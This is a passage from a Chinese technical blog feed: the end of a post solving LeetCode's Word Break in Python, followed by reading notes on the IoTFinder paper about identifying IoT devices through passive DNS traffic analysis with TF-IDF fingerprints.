class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> dp[i] <span class="keyword">and</span> s[i:j] <span class="keyword">in</span> wordDict:</span><br><span class="line">                    dp[j]=<span class="literal">True</span></span><br><span class="line">        <span class="comment">#print(dp)</span></span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a= Solution()</span><br><span class="line">s = <span class="string">"leetcode"</span></span><br><span class="line">wordDict = [<span class="string">"leet"</span>, <span class="string">"code"</span>]</span><br><span class="line">result=a.wordBreak(s,wordDict)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>True</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a= Solution()</span><br><span class="line">s = <span class="string">"applepenapple"</span></span><br><span class="line">wordDict = [<span class="string">"apple"</span>, <span class="string">"pen"</span>]</span><br><span class="line">result=a.wordBreak(s,wordDict)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>True</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a= Solution()</span><br><span class="line">s = <span class="string">"catsandog"</span></span><br><span class="line">wordDict = [<span class="string">"cats"</span>, <span class="string">"dog"</span>, <span class="string">"sand"</span>, <span class="string">"and"</span>, <span class="string">"cat"</span>]</span><br><span class="line">result=a.wordBreak(s,wordDict)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>[True, False, False, True, True, False, False, True, False, False]False</code></pre><h3 id="方法二：记忆化回溯"><a href="#方法二：记忆化回溯" class="headerlink" title="方法二：记忆化回溯"></a>方法二：记忆化回溯</h3><ol><li>使用记忆化函数，保存出现过的 backtrack(s)，避免重复计算。</li><li>定义回溯函数 backtrack(s)</li></ol><ul><li>若 s 长度为 0，则返回 True，表示已经使用 wordDict中的单词分割完。</li><li>初始化当前字符串是否可以被分割 res=False</li><li>遍历结束索引 i，遍历区间 [1,n+1)：<ul><li>若 $s[0,\cdots,i-1]$在 wordDict中：$res=backtrack(s[i,\cdots,n-1])\ or\ res$。<blockquote><p>解释：保存遍历结束索引中，可以使字符串切割完成的情况。</p></blockquote></li></ul></li><li>返回 resres</li></ul><ol start="3"><li>返回 backtrack(s)</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wordBreak</span><span class="params">(self, s: str, wordDict)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">import</span> functools</span><br><span class="line"><span class="meta">        @functools.lru_cache(None)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">back_track</span><span class="params">(s)</span>:</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">not</span> s):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            res=<span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(s)+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span>(s[:i] <span class="keyword">in</span> wordDict):</span><br><span class="line">                    res=back_track(s[i:]) <span class="keyword">or</span> res</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">return</span> back_track(s)</span><br><span class="line"></span><br><span class="line">a= Solution()</span><br><span class="line">s = <span class="string">"catsandog"</span></span><br><span class="line">wordDict = [<span class="string">"cats"</span>, <span class="string">"dog"</span>, <span class="string">"sand"</span>, <span class="string">"and"</span>, <span class="string">"cat"</span>]</span><br><span class="line">result=a.wordBreak(s,wordDict)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>False</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【PapersReading】通过被动DNS流量分析识别大规模IoT设备</title>
      <link href="2020/12/13/Paper-01-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
      <url>2020/12/13/Paper-01-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<p>见下文。</p><a id="more"></a><h2 id="论文"><a href="#论文" class="headerlink" title="论文"></a>论文</h2><p><a href="2-IoTFinder-ESP20.pdf">IoTFinder: Efficient Large-Scale Identification of IoT Devices via Passive DNS Traffic Analysis</a></p><p> September 7-11, 2020 (all-digital event)<br>5th IEEE European Symposium on Security and Privacy</p><p>这是一篇S&amp;P上收录的论文</p><h2 id="论文摘要"><a href="#论文摘要" class="headerlink" title="论文摘要"></a>论文摘要</h2><ul><li>本文要解决问题</li></ul><p>识别潜在的易受攻击的IoT设备</p><ul><li>解决方案</li></ul><p>提出一个IoTFinder系统，通过被动DNS流量分析，能够大规模、高效的识别IoT设备</p><ul><li><p>数据收集：收集分布式被动DNS数据</p></li><li><p>该系统基于机器学习</p></li><li><p>仅基于DNS指纹识别IoT设备</p></li><li><p>识别的广泛性：该系统不论IoT设备处于NAT下，其他中间盒、还是分配了IP4或IP6地址，也能进行识别</p></li><li><p>IoTFinder</p><ul><li>多标签分类器</li><li>本文通过不同设置评估了其分类的准确性<ul><li>不同的DNS流量数据</li></ul></li><li>实验结果表明，即使将它们托管在NAT之后并且其流量与由同一本地网络中托管的其他IoT和非IoT设备生成的流量“混合”在一起，我们的方法也可以准确地检测许多不同的IoT设备。</li></ul></li></ul><p>本文主要关于：</p><p>   IoT安全</p><p>   流量模型</p><p>   被动DNS</p><h3 id="B相关知识学习"><a href="#B相关知识学习" class="headerlink" title="B相关知识学习"></a>B相关知识学习</h3><h4 id="被动DNS（Passive-DNS）"><a href="#被动DNS（Passive-DNS）" class="headerlink" title="被动DNS（Passive DNS）"></a>被动DNS（Passive DNS）</h4><p><a href="https://developer.aliyun.com/article/764940" target="_blank" rel="noopener">https://developer.aliyun.com/article/764940</a></p><p><a href="https://securitytrails.com/blog/passive-dns" target="_blank" rel="noopener">https://securitytrails.com/blog/passive-dns</a></p><p><a href="https://xz.aliyun.com/t/5991" target="_blank" rel="noopener">https://xz.aliyun.com/t/5991</a></p><ul><li><p>DNS：域名与IP地址相互映射的分布式数据库</p></li><li><p>域名解析：通过域名获取IP地址的过程</p></li><li><p>被动DNS:</p><blockquote><ul><li>与传统的DNS（实时系统需要查询DNS服务器和解析器以将主机名转换为IP地址）不同，被动DNS的工作方式却相反。<br>这意味着始终存在一个DNS数据库，用于存储DNS记录，IP地址查找以及有关与通用DNS通信中涉及的域，服务器和IP地址有关的所有内容的统计信息。此信息将保存在安全的数据库中，以供以后分析，该数据库会将实时DNS结果转换为被动DNS数据。</li><li>顾名思义，也即通过被动获取DNS数据（在互联网中，通过流量抓取工具获取DNS数据），这些数据被存储到一个中央安全数据库，形式Passive DNS。这种数据信息和一些本地DNS数据不同的是，它包含的不仅是当前的DNS数据（包括IP映射等），还包括了历史上所存在的一些DNS数据映射等。比如，一个域名在某个时间段内可以解析到多个IP地址上，一个IP地址也可以某个时间段内映射在多个域名，这些映射历史都是可以被Passive DNS数据包含在内，这样研究者可以从这些关联数据中发现已知的恶意域名与未知恶意域名之间的关系，从而挖掘出未知的威胁风险。</li></ul></blockquote></li></ul><ul><li><p>Passive DNS应用场景</p><p>  检测网站钓鱼域名<br>  阻断垃圾邮件干扰<br>  识别恶意域名<br>  提供威胁情报<br>  检测域名劫持<br>  品牌保护<br>  域名DNS历史记录查询<br>  查询主域名下的所有子域名</p></li><li><p>被动DNS工作原理</p></li></ul><p>通过实例简单了解</p><p>以下实例，使用到的是美国Farsight Security公司推出的Passive DNS数据库—-DNSDB，有关这一案例的更多信息，可参考该公司的Passive DNS白皮书：<a href="https://info.farsightsecurity.com/passive-dns-ebook" target="_blank" rel="noopener">https://info.farsightsecurity.com/passive-dns-ebook</a></p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201213paper01.png" width="500px"><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul><li><p>面临挑战</p><p>  传统通过banner grabbing  和fingerprinting 能够识别暴露网络服务的设备包括IoT设备，</p><p>  但是当IoT设备托管在NAT或者其他中间盒后（防火墙），主动探测不能够识别IoT设备</p><p>  当IoT设备被分配IPv6地址时，识别也面临挑战</p></li></ul><h3 id="B相关知识学习-1"><a href="#B相关知识学习-1" class="headerlink" title="B相关知识学习"></a>B相关知识学习</h3><h4 id="banner-grabbing（横幅抓取）"><a href="#banner-grabbing（横幅抓取）" class="headerlink" title="banner grabbing（横幅抓取）"></a>banner grabbing（横幅抓取）</h4><p><a href="https://securitytrails.com/blog/banner-grabbing" target="_blank" rel="noopener">https://securitytrails.com/blog/banner-grabbing</a></p><p>横幅抓取是一种用于确定远程计算机上正在运行的服务的信息的活动</p><p>在渗透测试或安全审核期间，无论何时执行智能侦察过程，我们都需要注意当前Web服务器的公开信息。</p><p> 这就是banner grabbing的来源。banner grabbing是获取软件横幅信息（名称和版本）的一种方法，无论是手动完成的，还是使用任何可自动为您完成的OSINT工具。</p><p> FTP服务器，Web服务器，SSH服务器和其他系统守护程序通常会公开重要信息，这些信息不仅涉及软件名称，而且还涉及它们所运行的确切版本和操作系统（相关的“横幅”数据）。</p><p> 在匹配关键CVE的情况下，对任何协议进行抢夺式攻击都可能发现不安全和易受攻击的应用程序，这可能导致服务利用和损害。</p><p> 您如何进行标语抢夺攻击？ 只需选择您要定位的服务，启动请求，检查收到的响应即可。</p><h4 id="fingerprinting-指纹"><a href="#fingerprinting-指纹" class="headerlink" title="fingerprinting(指纹)"></a>fingerprinting(指纹)</h4><p><a href="https://securitytrails.com/blog/cybersecurity-fingerprinting" target="_blank" rel="noopener">https://securitytrails.com/blog/cybersecurity-fingerprinting</a></p><p>物理世界，指纹通常唯一标识单个个体，分析指纹是用于识别与所有类型的犯罪活动有关的最流行的技术之一，从抢劫到绑架甚至是谋杀。</p><p>在数字世界中，也有分析指纹的方法，但是从这个意义上讲，我们是在谈论操作系统，网络和服务指纹。</p><p>网络安全中的指纹</p><blockquote><ul><li>数字世界中的指纹与现实世界中的人类指纹相似。简而言之，指纹是可以用来检测软件，网络协议，操作系统或硬件设备的一组信息。</li><li><strong>指纹（也称为足迹）</strong>是一种使用该信息将数据集关联起来的技术，以便以较高的可能性识别网络服务，操作系统编号和版本，软件应用程序，数据库，配置等。</li><li>一旦渗透测试人员获得足够的信息，此指纹数据就可以用作针对目标的利用策略的一部分</li></ul></blockquote><h3 id="IoTFinder设计期望"><a href="#IoTFinder设计期望" class="headerlink" title="IoTFinder设计期望"></a>IoTFinder设计期望</h3><ul><li><p>Fully-automated fingerprint learning（全自动指纹学习）</p></li><li><p>One fingerprint per IoT device（每个物联网设备一个指纹）</p><ul><li><p>给一个DNS流量跟踪D，从Ik设备学习得到一个指纹fk，利用fk作为二分类判断Ik是否产生或者有贡献于在D中看到DNS活动</p></li><li><p>multi-label classification</p><p>与多类别分类方法不同，这些单独的指纹使我们可以轻松地执行多标签分类，从而可以识别可能在同一（NAT）IP地址后共同托管的多个不同的物联网设备</p></li></ul></li><li><p>在混合网络流量中准确识别IoT设备</p></li><li><p>结果可解释</p></li><li><p>有效的匹配</p></li></ul><h3 id="本文贡献"><a href="#本文贡献" class="headerlink" title="本文贡献"></a>本文贡献</h3><ul><li>提出了IoTFinder系统，可有效大规模检测IoT设备。其旨在自动从真实IoT设备中学习统计DNS流量指纹，并对地理位置不同的网络位置收集的大量DNS流量上进行有效的匹配来源指纹。</li><li>IoTFinder用作多标签分类器，即IoT设备位于NAT后面，并且其流量与由同一本地网络中托管的其他IoT和非IoT设备生成的流量“混合”，也能够检测到IoT设备。</li><li>为了评估统计模型的准确性，我们在几种不同的设置下对我们的IoT指纹进行了详细评估，包括通过第三方IoT流量数据集计算检测结果。 这些详细的实验使我们能够突出提出的方法的优点，并指出可能的局限性</li><li>我们还将物联网指纹应用于在美国的ISP收集的DNS流量上，该ISP托管了超过4000万客户，以评估我们系统的性能。 我们的结果表明，我们可以在有限的时间内（略大于一小时）有效地处理一整天的ISP级DNS流量，并测试所有IoT指纹。</li></ul><h2 id="直觉和方法概述"><a href="#直觉和方法概述" class="headerlink" title="直觉和方法概述"></a>直觉和方法概述</h2><h3 id="IoT数据收集"><a href="#IoT数据收集" class="headerlink" title="IoT数据收集"></a>IoT数据收集</h3><p>建立大型物联网实验室，包括多个语音助手、摄像头等53台来自不同供应商的活动IoT设备。这些设备部署在人参与的实验室中。本文特别关注IoT设备<br>生成的DNS流量，实验中使用的IoT DNS数据集跨越1.5个月。</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201213paper02.png" width="500px"><h3 id="激励的示例"><a href="#激励的示例" class="headerlink" title="激励的示例"></a>激励的示例</h3><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201213paper03.png" width="500px"><p>上图表示，24个小时内部分IoT设备查询域名的情况，</p><p>水平表示每个IoT设备查询的域名，</p><p>垂直代表一个小时的窗口，</p><p>原点表示DNS查询的次数</p><ul><li><p>基于IoT设备产生的DNS活动构建简单探测模型</p><p>  文献【19】提出类似模型：给定特定IoT设备的查询的一组域和从第三方网络收集的被动DNS跟踪，如果跟踪中DNS客户端（例有匿名ID或IP地址标识）查询的域名在特定IoT设备查询域中，就将该客户端的IP（或匿名ID）标记为IoT设备托管在其下。</p><ul><li>此模型问题<ul><li>容易产生大量误报</li><li>易通过探测域（该域是否包含人类可访问内容）过滤掉一些域名，从而会丢弃一些信息，降低潜在的分类能力</li><li>也会丢弃不包含供应商名称或设备型号名称的域名</li><li>使用单个域名检测IoT设备，可能会导致识别共享DNS行为（例，来自同一供应商的不同设备型号）的设备产生严重混淆</li></ul></li></ul></li><li><p>因此本文想法：</p><ul><li>组合域名，以及不同IoT设备发出DNS查询的频率通常是具体的。这一观察结果有利于构建</li><li>一组有区别的行为指纹，可识别不同IoT设备模型，并当与普通客户端DNS行为匹配时，不易触发大量误报。</li><li>利用该直觉构建一个系统<ul><li>自动学习基于DNS的IoT指纹，</li><li>无需对查询域名格式严格假设</li><li>无需手动推导过滤启发式减少误报</li></ul></li></ul></li></ul><h3 id="方法概述"><a href="#方法概述" class="headerlink" title="方法概述"></a>方法概述</h3><p>构建高效的基于DNS的IoT设备指纹，将IoT设备检测和文档检索进行类比【20】</p><ul><li>名称表示<ul><li>$C_i$表示通用设备（IoT或非IoT），实践中由设备的IP(v4或v6)地址表示</li><li>$d_{ij}$是设备$C_i$查询的域名</li><li>$f_{ij}$是$d_{ij}$在$C_i$的DNS流量中出现的频率</li></ul></li></ul><p>我们把$C_i={(d_{ij},f_{ij})}<em>j$视为包含一组$d</em>{ij}$术语的文档，每个术语都有各自的术语频率$f_{ij}$</p><ul><li>名词表示<ul><li>$Q_k$为IoT设备</li><li>$q_{kj}$为$Q_k$查询的域名</li><li>$f_{kj}$为$Q_k$查询$q_{kj}$的频率</li></ul></li></ul><p>沿用文档检索的类比，将$Q_k={(q_{kj},f_{kj})}_j$作为搜索查询词，识别IoT设备的任务是：</p><blockquote><p>检索与搜索查询$Q_k$相似的所有文档$C_i$,并根据相似度排序</p></blockquote><p>根据类比，为了计算IoT设备$Q_k$的DNS行为与通用设备$C_i$的DNS行为之间的相似性</p><blockquote><p>首先将每个$Q_k$和$C_i$转换为各自的<strong>TF-IDF</strong>(即术语频率-逆文档频率)特征向量表示【20】，然后测量相似性（例，余弦相似性）在得到的特征向量之间。</p></blockquote><h4 id="B相关知识学习-2"><a href="#B相关知识学习-2" class="headerlink" title="B相关知识学习"></a>B相关知识学习</h4><h5 id="TF-IDF（术语频率-逆文档频率）"><a href="#TF-IDF（术语频率-逆文档频率）" class="headerlink" title="TF-IDF（术语频率-逆文档频率）"></a>TF-IDF（术语频率-逆文档频率）</h5><p>TF-IDF反映了在文档集合中一个单词对一个文档的重要性，经常在文本数据挖据与信息提取中用来作为权重因子</p><p><a href="词频-逆文档频率(TF-IDF).ipynb">参考TF-IDF</a></p><h4 id="面临挑战"><a href="#面临挑战" class="headerlink" title="面临挑战"></a>面临挑战</h4><p>主要有关IoT设备模型和文档检索之间的类比。</p><p>无论IoT设备是位于NAT后还是和其它设备一起，我们匹配IoT设备的目标都不能立即适合文档检索场景。</p><p>文档检索更青睐于单个主题的检索，相比于含多个主题的文档相比，不希望这不利于匹配托管于NAT后的IoT设备或者处于相同IP地址的（IoT或非IoT）<br>等等。。。</p><h2 id="系统详细设计"><a href="#系统详细设计" class="headerlink" title="系统详细设计"></a>系统详细设计</h2><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201213paper04.png" width="500px"><h3 id="基于DNS的IoT指纹学习"><a href="#基于DNS的IoT指纹学习" class="headerlink" title="基于DNS的IoT指纹学习"></a>基于DNS的IoT指纹学习</h3><p>为了模型化IoT设备的DNS行为，进行如下操作：</p><ul><li>$Q_k={q_{kj}}<em>{j=1}^{m_k}$，表示一个IoT设备在$T_l$时间内查询$m_k$个不同的域名$q</em>{kj}$</li><li>将$T_l$划分成长度为$w$且不重叠的时间窗口</li><li>$N_w=\frac{T_l}{w}$表示长度为$w$的时间窗口个数</li><li>给定$q_{kj}$，通过判断其是否在时间窗口中，$n_{q_{kj}}$表示在$N_w$个时间窗口，查询域名$q_{kj}$的次数</li><li>定义$p_{kj}=\frac{n_{q_{kj}}}{N_w}$，表示设备$Q_k$查询的域名$q_{kj}$在任意长度w的时间窗口内至少查询一次的概率</li><li>则每个IoT设备$Q_k$的统计指纹为$P_k={(q_{kj},p_{kj})}_{j=1}^{m_k}$</li></ul><p>建立查询频率和词频之间的映射取决于测试时考虑的流量窗口的长度</p><p>离散化时间处理过程能够弥补相同供应商和相同模型的IoT设备查询频率可能的短期变化</p><ul><li>例如，相同的IoT设备Ia 和Ib，Ia部署在缓存DNS转发器（例，NAT），Ib直接或者通过非缓存的中间盒设备连接到ISP network，两者的查询频率可能不同（由于处于不同的middlebox下）</li><li>设置w的长度超过DNS资源记录(例，A记录 或者AAAA记录)TTL，能够使得Ia和Ib的DNS缓存行为近似相等，使得查询频率近似相等</li></ul><p>这样更精确化的进行IoT指纹的匹配，后面讨论时间窗口w的取值</p><p>计算IDF：估计每个IoT查询的域在全局DNS 跟踪中的反向“流行度”</p><ul><li>$Q={q_i}_{i=1}^m$表示任意IoT设备查询的不同域名的集合</li><li>类似，$Q=\bigcup{q_{kj}}_{j=1}^{m_k}$</li><li>$T_p$表示被动DNS跟踪收集的观察时间</li><li>$N_c(q_i)$表示在$T_p$时间内查询域名$q_i\in Q$的客户端数，$N_c$表示在$T_p$时间内至少查询一个IoT域名的总的客户端数量</li><li>定义$IDF(q_i)=\log(1+\frac{N_c}{N_c(q_i)+1})$，也即表示有机会匹配一个IoT设备，域名$q_i$越少见，其逆文档频率越高（其特异性越高）</li></ul><p>实践中，从模型中筛选较为流行的域名。在文档检索类别中，过滤掉“stop word”域名，如过滤d域名（例：google.com）,过滤掉d和<a href="http://www.d" target="_blank" rel="noopener">www.d</a> 过滤目的：</p><ul><li>减少测试时要考虑匹配的客户端数量$C_i$，从而使指纹匹配更加高效</li><li>减少触发误报的概率，因为高度流行的域名被大多数非IoT设备查询，从而可能导致虚假匹配</li></ul><p>学习过程中，获得每个IoT设备的统计指纹，一个IoT设备指纹应包含内容：</p><ul><li>IoT域查询频率：对每个IoT设备$Q_k$， $P_k={(q_{kj},p_{kj})}_{j=1}^{m_k}$</li><li>用来计算$P_k$的时间窗口$w$</li><li>每个域的IDF值：${IDF(q_{kj})}_{j=1}^{m_k}$</li><li>基于每个设备的最大容许假阳性率$\phi$计算的探测阈值$\theta_k$</li></ul><h3 id="基于DNS的IoT指纹匹配"><a href="#基于DNS的IoT指纹匹配" class="headerlink" title="基于DNS的IoT指纹匹配"></a>基于DNS的IoT指纹匹配</h3><p>本节阐释基于DNS的IoT指纹如何与未来的被动DNS追踪进行匹配</p><p>相关名词：</p><ul><li>$T_t$作为被动观察DNS流量的时间窗口</li><li>$C_i$表示DNS流量中DNS查询的一个客户端</li></ul><p>我们目标：在指纹$P_k$和$C_i$的DNS行为之间，计算一个得分$s_{ki}$，</p><p>计算TF-IDF向量：</p><ul><li>计算时间窗口个数：$N_t=\lceil \frac{T_t}{w} \rceil$，其中$w$和学习$P_k$时使用的是相同的</li><li>设定$f_{kj}=p_{kj}*N_t$，则TF向量$V_k={(q_{kj},f_{kj})}<em>{j=1}^{m_k}$，$f</em>{kj}$表示的是在$T_t$时间内，IoT设备k查询域$q_{kj}$的时间窗口个数</li><li>最后，计算相应TF-IDF值$\psi_{kj}=f_{kj}*IDF(q_{kj})$</li><li>使用$\Psi_k={(q_{kj},\psi_{kj})}_{j=1}^{m_k}$表示时间$T_k$内IoT设备$Q_k$的TF-IDF向量</li></ul><p>计算客户端$C_i$的TF-IDF向量</p><ul><li>假定$C_i$在$T_t$时间内查询$n_i$个不同的域名$d_{ij}$及其发生的频率$f_{ij}$</li><li>即$C_i={(d_{ij},f_{ij})}<em>{j=1}^{n_i}$，其中$f</em>{ij}$是计算查询域名$d_{ij}$的时间窗口w的个数</li></ul><p>计算一个IoT的TF-IDF向量和一个客户端$C_i$之间的相似性</p><ul><li><p>将$C_i$映射到$\Psi_k$的$m_k$空间中，实际上，计算新向量$C_i’={(q_{kl},f_{kl}’)}_{l=1}^{m_k}$</p><ul><li>其中，${q_{kl}}_{l=1}^{m_k}$表示的是和$\Psi_k$相同的$m_k$域名集合</li></ul></li><li><p>若$q_{kl}=d_{ij}，则f_{kl}’=f_{ij}$</p></li><li><p>若没有域名$d_{ij}$匹配$q_{kl}，则f_{kl}’=0$</p></li><li><p>换种说法，也即是我们取所有由客户端$C_i$查询的域同时也被IoT设备查询的域。设置它们的TF值，以反映在时间Tt中$C_i$询问它们的频率。如果一个IoT设备$Q_k$查询的域不在$C_i$的行为中，设定他的频率为0</p></li></ul><ul><li>最后计算，TF-IDF向量$\Gamma_i={(q_{kl},\gamma_{kl})}<em>{l=1}^{m_k}$，其中$\gamma</em>{kl}=f_{kl}’ \cdot IDF(q_{kl})$</li></ul><p>这种将$C_i$的行为“投射”到$Q_k$的域名空间能够实现我们主要目标之一</p><ul><li>能够避免仅仅因为$C_i$表示共存于同一IP地址后面(例如，在NAT后面)的多个设备(可能包括几个其他物联网和非物联网设备)的DNS流量，而惩罚$Q_k$和$C_i$的相似性分数，</li></ul><p>现在拥有两个跨度相同的向量空间$\Psi_k$和$\Gamma_i$</p><ul><li>令$\psi=[\psi_{kj}]，\gamma=\gamma_{kj}$是包含$\Psi_k和\Gamma_i$的两个向量</li><li>计算匹配分数：$s(\Psi_k,\Gamma_i)=\frac{\psi \cdot \gamma}{||\psi||\cdot ||\gamma||}$(例，计算两者余弦相似度)</li><li>若$s(\Psi_k,\Gamma_i)\geq \theta_k$，就认为$C_i$的DNS行为匹配IoT设备$Q_k$，其中$\theta_k$是自动计算的阈值，将误报的数量限制在预定的最大值$\phi$</li></ul><h3 id="学习设备检测阈值"><a href="#学习设备检测阈值" class="headerlink" title="学习设备检测阈值"></a>学习设备检测阈值</h3><p>为了学习每个特定设备的检测阈值$\theta_k$，进行如下步骤</p><ul><li><p>收集大的数据集$D$(在训练中的未被看到，标记为被动DNS追踪)，实践中，$D$为我们提够了大量非IoT设备的流量记录，构成负面数据</p></li><li><p>在$D$中获取$C_i$的行为，并将其与之前学习的IoT指纹进行匹配</p></li><li><p>计算每个指纹和$D$中每个非IoT设备之间的余弦值$s(\Psi_k,\Gamma_i)$</p></li><li><p>调整检测阈值$\theta_k$计算假阳性的变化</p></li><li><p>同样，考虑IoT设备$Q_k$生成的未见过的DNS流量，使用该流量计算每个IoT设备指纹$\Psi_k$的真阳率</p></li></ul><p>给定最大容许假阳率$\phi$，目标找到检测阈值$\theta_k$，满足两个要求：</p><ul><li>指纹$\Psi_k$产生的假阳率$F_k\leq \phi$</li><li>保持$F_k\leq \phi$时，最大化真阳率</li></ul><p>ROC曲线图（随着检测阈值变化，真阳性率和假阳性率之间的权衡）</p><p>如图带有线性插值的ROC曲线</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201213paper05.png" width="500px"><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201213paper06.png" width="500px"><h3 id="IoT指纹部署"><a href="#IoT指纹部署" class="headerlink" title="IoT指纹部署"></a>IoT指纹部署</h3><p>本节讨论如何枚举野外IoT设备</p><p>由于计算量大的问题，为了解决这个问题，我们在一个大型Apache Spark集群中实现了我们的特征向量计算和指纹匹配，使得来自一个大型ISP的真实世界的DNS流量的N ×M指纹匹配计算时间减少到每天不到一个小时(详见第4节)。</p><h2 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h2><h3 id="B相关知识"><a href="#B相关知识" class="headerlink" title="B相关知识"></a>B相关知识</h3><p>DPI（Deep Packet Inspection）是一种基于数据包的深度检测技术，针对不同的网络应用层载荷（例如HTTP、DNS等）进行深度检测，通过对报文的有效载荷检测决定其合法性。</p><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h2><ul><li><p>许多工作探索了使用网络流量分析来检测网络中的物联网设备或研究它们的行为[23]-[37]。</p></li><li><p>其中一些工作利用网络流量统计进行设备识别[23]-[25]或受损设备检测[26]-[28]</p></li><li><p>其他工作使用了对不同应用层协议的分析，如HTTP、Telnet、DNS等。，识别物联网设备[29]-[32]</p></li><li><p>此外，还提出了主动探测技术，通过扫描网络资产[28]、[33]或使用设备的媒体访问控制地址来识别供应商和产品类型[38]、[39]，从而识别物联网设备。</p></li></ul><p><strong>值得注意的是</strong>，这些作品中有许多需要访问物联网设备所在的本地网络，或者访问网络流，而在非常大的规模上收集这些网络流通常很昂贵。另一方面，我们专注于仅基于大规模被动DNS流量分析来高效检测物联网设备，因为全球分布式DNS流量通常更容易大规模收集(在某些情况下可以购买)</p><ul><li>最近的一些作品研究了物联网设备产生的域名系统流量的特征[35]，[36]，并讨论了相关的隐私含义[34]，[40]。最近，有两项工作考虑将DNS流量用于物联网设备检测[19]，[37]。据我们所知，[19]，[37]是最接近我们的工作</li></ul><p>在[19]中，作者使用域名查询和物联网设备联系的目的IP地址来构建设备检测系统。如第2.2节所述，郭等人[19]提出了一些手动设计的启发式方法来过滤掉可能引起误报的物联网查询域。例如，给定物联网设备查询的一组域，它们探测这些域以确定它们是否是“面向人类的”(即，它们是否包含人类可访问的内容)。此外，他们还会过滤掉不包含物联网设备供应商名称的域名。然而，如第2.2节所述，这种启发式方法可能会丢弃具有高度歧视性的域名，并可用于更准确地检测特定物联网设备的存在。更重要的是，[19]建议使用单一域名进行检测，这可能会在具有重叠DNS行为的设备(例如，来自同一供应商的不同设备型号)之间造成严重混淆。另一方面，IoTFinter并不依赖于上面提到的启发式，而是可以基于设备查询的域名组合自动学习物联网设备检测模型。此外，IoTFinter会自动学习每个统计物联网指纹的检测阈值，以便将可能的误报限制在所需的容许量内。</p><p>在构建了IoTFinter之后，我们意识到最近发表的一篇文章[37]也提出了使用TF-IDF来模拟由物联网设备生成的DNS流量。然而，[37]与我们的工作大不相同。首先，在[37]中提出的系统要求要分类的流量必须已知来自单个物联网设备。引用[37]:[检测]算法应仅在已知流量文档属于已知为物联网设备的设备时调用。”相反，IoTFinder不需要这种先验知识，即使物联网设备与许多其他物联网和非物联网设备共同托管在同一个IP地址后面(例如，在同一个NAT后面)，也能够检测到它们。其次，在[37]中，检测阈值必须由操作员手动设置，而我们设计了一个</p><p>一种算法，用于标记现实世界的非物联网流量，并自动学习每个设备模型的检测阈值，以达到预定的最大容许误报率。此外，[37]中介绍的检测管道依赖于WHOIS记录和x509证书来识别物联网设备的供应商。然而，在许多实际情况下，域名的所有者可能与供应商不同，例如当使用私有的WHOIS记录时，或者当服务托管在与云相关的域(例如AWS)上时。在这种情况下，设备最终可能会被分配给错误的供应商。这种错误的决定将级联到设备类型分类器，这依赖于供应商分类器的成功来进行正确的设备识别[37]。我们的工作不一样，因为我们只依靠DNS流量分析，对一个物联网设备查询的域名的归属不做任何假设。此外，我们专注于大规模检测，并实施IoTFinter，以有效检测托管数千万客户端的大型ISP网络中的许多不同物联网设备。</p><p>还有一项提议是通过自动域名注册来识别物联网设备[41]。然而，目前还不清楚这一提议在未来是否会被广泛采用，因为它需要物联网供应商的合作。此外，遗留物联网设备可能通过这种机制保持不可检测。另一方面，我们的系统不需要物联网供应商的合作，可以“原样”检测物联网设备，包括可能不支持未来协议的遗留设备。</p><h2 id="讨论和限制"><a href="#讨论和限制" class="headerlink" 